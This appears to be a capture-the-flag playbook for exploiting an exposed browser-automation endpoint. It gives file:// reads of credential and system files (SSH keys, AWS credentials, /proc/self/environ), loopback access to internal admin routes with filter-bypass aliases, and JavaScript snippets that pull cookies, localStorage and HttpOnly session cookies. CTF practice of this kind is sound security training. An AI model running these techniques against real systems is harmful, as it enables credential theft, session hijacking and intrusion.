# Attack surface deep — the exposed endpoint's full reach

## The read primitive, in depth

`file://` navigation returns the file wrapped in an HTML document —
the browser renders the file as a text page:

```html
<html><body><pre>root:x:0:0:root:/root:/bin/bash
...the file's text...</pre></body></html>
```

Parse the `<pre>`/body text out — the read is the file's contents,
wrapped not raw. A binary file may render as mojibake or trigger a
download instead of a render — for binary, `execute` `fetch` + base64
is the reliable read.

## The file-read escalation table

| Read | Yields |
|---|---|
| `/etc/passwd` | user list, the canary |
| `/flag`, `/flag.txt` | the flag, direct |
| `/proc/self/environ` | env vars — `FLAG`, paths, secrets |
| `/proc/self/cmdline` | the driver's launch args |
| `/app/*`, `/srv/*`, `/var/www/*` | app source, config |
| `~/.ssh/id_rsa`, `~/.aws/credentials` | keys |
| `/proc/self/mounts` | mounted filesystems — flag locations |
| `/root/*`, `/home/*/*` | dotfiles, the flag in a home dir |

`/proc/self/environ` is the highest-yield single read after `/flag` —
env vars routinely carry the flag or the path to it.

## The loopback read, in depth

The browser's `localhost` is the challenge host — the app itself plus
any internal services:

```
http://localhost:APPPORT/admin     -> the app's internal admin
http://localhost:APPPORT/debug     -> debug routes
http://localhost:INTERNAL/*        -> a second service on another port
http://localhost:PORT/metrics      -> a metrics endpoint
http://127.0.0.1, [::1], 0.0.0.0   -> loopback aliases when localhost is filtered
```

The internal surface is often the richer read — an admin panel or a
debug route the external view cannot reach, serving the flag or a
key.

## The execute primitive, in depth

`execute/sync` runs in the page's context with its origin and cookies —
the richest read:

```javascript
// cookie jar via JS (JS-visible only)
return document.cookie;
// storage
return JSON.stringify(localStorage);
// same-origin API — rides the browser's cookies
return fetch('/api/me').then(r=>r.text());
// a file when nav is blocked
return fetch('file:///flag').then(r=>r.text());
```

`execute/async` resolves a promise — `arguments[0](result)` returns it.
Use it for `fetch` chains so the resolved text returns, not a pending
promise.

## The cookie-jar read

`GET /session/{id}/cookies` reads the jar — `HttpOnly` included. The
flag-as-cookie case: the jar reads it when `document.cookie` cannot.
Read the jar for the *current origin* — set the browser to the flag's
origin first if needed.

## The screenshot read

`GET /screenshot` returns a base64 PNG of the viewport. The flag-as-
image case: a flag drawn as text-on-image, a QR, a rendered page whose
text source is mangled. Decode the PNG — it is the artifact.

## The capability escalation path

```
POST /session (exposed) 
  -> file:// nav   = file read
  -> localhost nav = internal reach  
  -> execute       = JS + origin + cookies
  -> cookies       = jar incl. HttpOnly
  -> screenshot    = rendered read
  -> CDP (if 9222) = the full protocol
```

Each primitive is a separate reach — a session that gives all of them
is a browser-rooted foothold on the challenge host.
